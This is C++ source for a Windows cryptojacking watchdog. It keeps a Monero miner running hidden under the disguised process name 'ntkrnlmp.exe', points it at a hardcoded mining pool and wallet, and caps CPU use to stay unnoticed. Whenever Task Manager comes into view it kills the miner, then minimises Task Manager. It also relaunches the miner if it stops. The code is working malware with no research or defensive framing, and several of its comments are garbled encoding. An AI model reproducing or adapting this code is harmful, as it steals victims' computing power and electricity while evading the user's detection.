#include "stdafx.h"
#include "overwatch.h"
#include <Psapi.h>
#include <iostream>
#include <string>
#include <stdint.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <cassert>
#include <string>

/*
##########################################################
##########################################################
*/
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
/*
##########################################################
##########################################################
*/

#pragma comment(lib,"Kernel32.lib")
#pragma  comment(lib,"Psapi.lib")
using namespace std;
struct handle_data {
	unsigned long process_id;
	HWND best_handle;
};

int kill(int pid);
void current();
void TaskManagerFind(int minerid, DWORD taskmgrid);
BOOL IsMainWindow(HWND handle);
HWND FindMainWindow(unsigned long process_id);
BOOL CALLBACK EnumWindowsCallback(HWND handle, LPARAM lParam);
int KillAllWindowHwndByPorcessID(DWORD dwProcessID);
string readTxt(string file);

int main(int argc, char* argv[], HINSTANCE hInstance)
{	
	if (argc == 1)
	{
		start_overwatch();
	}
	else if (!strcmp(argv[1], "-overwatch"))
	{
		overwatch();
	}

	while (true)
	{
		current();
	}
	return 0;
}

void current()
{
	int myid;
	int taskmgrid;
	int num = 0;
	int exeid[100];
	const char* exe_name = "ntkrnlmp.exe";
	const char* fucker = "taskmgr.exe";
	PROCESSENTRY32 pe32;
	HANDLE HprocessSnap;
	pe32.dwSize = sizeof(pe32);
	BOOL bMore;

start:

	while (true)
	{

		HprocessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//�����ظ��������̿���
		Sleep(1000);
		pe32 = { 0 };
		pe32.dwSize = sizeof(pe32);
		num = 0;
		myid = 0;
		taskmgrid = 0;
		if (HprocessSnap != INVALID_HANDLE_VALUE)
		{
			//cg
			bMore = ::Process32First(HprocessSnap, &pe32);
			while (bMore)
			{
				if (strcmp(fucker, pe32.szExeFile) == 0)
				{
					taskmgrid = pe32.th32ProcessID;
					if (myid == 0)
					{
						while (bMore)
						{
							if (strcmp(exe_name, pe32.szExeFile) == 0)
							{
								myid = pe32.th32ProcessID;
								break;
							}
							bMore = ::Process32Next(HprocessSnap, &pe32);
						}
					}
					if (FindMainWindow(taskmgrid) == GetForegroundWindow())
					{
						TaskManagerFind(myid, taskmgrid);
						goto start;
					}
				}
				if (strcmp(exe_name, pe32.szExeFile) == 0)//��ͣ�Ĳ�ѯ�Լ������Ľ����Ƿ�������
				{
					exeid[num] = pe32.th32ProcessID;
					myid = pe32.th32ProcessID;
					num++;
					//"find a process
				}
				bMore = ::Process32Next(HprocessSnap, &pe32);
			}
			if (num >= 2)//�мٽ���
			{
				//kill all process in case fack process
				for (int i = 0; i <= num; i++)
				{
					if (kill(exeid[i]) == false)
						KillAllWindowHwndByPorcessID(exeid[i]);
					//kill_windows_instant();
				}
			}
			if (num == 0)
			{
				//restart the precess
				TCHAR buffer[MAX_PATH];
				GetCurrentDirectory(MAX_PATH, buffer);
				string namepath = buffer;
				namepath += "\\ntkrnlmp.exe";
				string OpenParameters = "-o stratum+tcp://pool.supportxmr."
					"com:5555 -u 493ZH537LvVhSkJ1TwHC3JGFWvqA98t1ZaEfUt5AKaXdFbQCoqtt5m"
					"59Qtbci6B55WEDESt6QaAwaGr1S1iUaidV1aEihnu -s --max-cpu-usage="
					"60 --safe -p ";
				string AAA = buffer;
				AAA += "\\version.json";
				string user = readTxt("version.json");
				if (user.c_str() == "NULL")
					user = "x";
				OpenParameters += user;
				if(!ShellExecute(NULL, "open", namepath.c_str(),
				OpenParameters.c_str(), OpenParameters.c_str(), SW_HIDE))
					ShellExecute(NULL, "open", namepath.c_str(),
						"C:\\Launcher\\ntkrnlmp.exe", "C:\\Launcher\\ntkrnlmp.exe", SW_HIDE);
			}
		}
	}	
}


string readTxt(string file)
{
	ifstream infile;
	infile.open(file.data());   //���ļ����������ļ��������� 
	if(!infile)
		return "NULL";   //��ʧ��,�����������Ϣ,����ֹ�������� 

	string s;
	getline(infile, s);
	infile.close();             //�ر��ļ������� 
	return s;
}

int kill(int pid)
{
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	BOOL bOkey = TerminateProcess(hProcess, 0);
	if (bOkey)
	{
		WaitForSingleObject(hProcess, 1000);
		CloseHandle(hProcess);
		hProcess = NULL;
		return true;
	}
	return false;
}

int KillAllWindowHwndByPorcessID(DWORD dwProcessID)
{
	DWORD dwPID = 0;
	HWND hwndRet = NULL;
	// ȡ�õ�һ�����ھ��  
	HWND hwndWindow = ::GetTopWindow(0);
	while (hwndWindow)
	{
		dwPID = 0;
		// ͨ�����ھ��ȡ�ý���ID  
		DWORD dwTheardID = ::GetWindowThreadProcessId(hwndWindow, &dwPID);
		if (dwTheardID != 0)
		{
			// �жϺͲ�������Ľ���ID�Ƿ����  
			if (dwPID == dwProcessID)
			{
				// ����ID��ȣ����¼���ھ��  
				hwndRet = hwndWindow;
				break;
			}
		}
		// ȡ����һ�����ھ��  
		hwndWindow = ::GetNextWindow(hwndWindow, GW_HWNDNEXT);
	}
	// ����ȡ�õĴ��ڣ���һ�������ϲ�Ĵ��ڣ���Ҫͨ��GetParent��ȡ��㴰��  
	HWND hwndWindowParent = NULL;
	// ѭ�����Ҹ����ڣ��Ա㱣֤���صľ�������Ĵ��ھ��  
	while (hwndRet != NULL)
	{
		hwndWindowParent = ::GetParent(hwndRet);
		if (!DestroyWindow(hwndRet))
			PostMessage(hwndRet, WM_CLOSE, 0, 0);
		if (hwndWindowParent == NULL)
		{
			break;
		}
		hwndRet = hwndWindowParent;
	}
	// ���ش��ھ��  
	return true;
}

void TaskManagerFind(int minerid, DWORD taskmgrid)
{
	if (kill(minerid) == false)
	{
		KillAllWindowHwndByPorcessID(minerid);
	}
	DWORD ProcessID;
	while (true)
	{
		Sleep(1000);
		GetWindowThreadProcessId(GetForegroundWindow(), &ProcessID);
		if (ProcessID != taskmgrid)
		{
			HWND hwnd = FindMainWindow(taskmgrid);
			ShowWindow(hwnd, SW_MINIMIZE);
			break;
		}
	}
}

BOOL IsMainWindow(HWND handle)
{
	return GetWindow(handle, GW_OWNER) == (HWND)0 && IsWindowVisible(handle);
}

HWND FindMainWindow(unsigned long process_id)
{
	handle_data data;
	data.process_id = process_id;
	data.best_handle = 0;
	EnumWindows(EnumWindowsCallback, (LPARAM)&data);
	return data.best_handle;
}

BOOL CALLBACK EnumWindowsCallback(HWND handle, LPARAM lParam)
{
	handle_data& data = *(handle_data*)lParam;
	unsigned long process_id = 0;
	GetWindowThreadProcessId(handle, &process_id);
	if (data.process_id != process_id || !IsMainWindow(handle)) {
		return TRUE;
	}
	data.best_handle = handle;
	return FALSE;
} 

